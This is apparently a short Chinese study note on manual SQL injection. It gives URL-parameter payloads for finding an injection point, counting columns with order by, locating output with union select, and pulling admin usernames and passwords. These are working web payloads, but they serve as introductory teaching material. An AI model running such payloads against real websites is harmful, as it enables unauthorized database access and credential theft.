---
title: 【笔记】SQL Injection 注入攻击
categories:
  - 网络安全
date: 2020-03-27 23:46:23
---

## 前言

SQL注入攻击入门学习笔记

<!-- more -->

## 本质

- 攻击者通过构造不同的SQL语句来实现对数据库的操作

## 条件

1. 参数用户可控

2. 参数带入数据库查询

## SQL手注的一般流程

### 判断注入点

- 通过sql语句的boolean值，查看返回页面的现实状态，如果出现异常，则有可能存在sql注入

``` sql
?id=1 and 1=1
?id=1 and 1=2
```

### 判断字段数

- 利用`order by`排序语句，依次排序每个字段（通过编号），直到报错，则报错的前一个数为数据库字段数

``` sql
?id=1 order by 1;
?id=1 order by 2;
?id=1 order by 3;
```

### 判断回显点

- 通过查看临时的数据，查看网页返回数据后显示的内容位置，来判断回显点

``` sql
?id=1 union select 1,2 from admin;
```

### 查询相关内容

- 将查看回显点改为查看管理员用户名和密码

``` sql
?id=1 union select username,password from admin;
```

## 完成

## 参考文献

[哔哩哔哩——腾讯掌控安全学院](https://www.bilibili.com/video/BV1qt41157pF)

